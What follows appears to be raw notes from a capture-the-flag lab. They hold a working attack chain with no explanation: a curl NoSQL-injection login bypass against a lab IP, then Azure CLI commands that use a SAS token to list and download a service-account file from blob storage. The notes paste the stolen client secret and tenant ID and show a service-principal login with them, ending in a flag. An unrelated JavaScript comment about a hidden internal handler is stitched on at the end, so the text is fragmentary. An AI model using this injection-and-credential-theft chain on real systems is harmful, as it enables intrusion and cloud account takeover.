```
curl -i -X POST http://10.145.185.179/login -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

az storage blob list --account-name cryptocabanaf5scjagc --container-name backups
--sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz/h0="


az storage container listn--account-name cryptocabanaf5scjagc --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"



az storage blob list --account-name cryptocabanaf5scjagc --container-name vault --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"


az storage blob download --account-name cryptocabanaf5scjagc --container-name vault --name backup-service-account.json --file backup-service-account.json --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"



"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
"client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
"tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
"key_vault_name":"ccabana-kv-f5scjagc"


az login --service-principal --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 --password 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c

 "value": "THM{n0t_ur_k3ys_n0t_ur_c01ns!}



// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");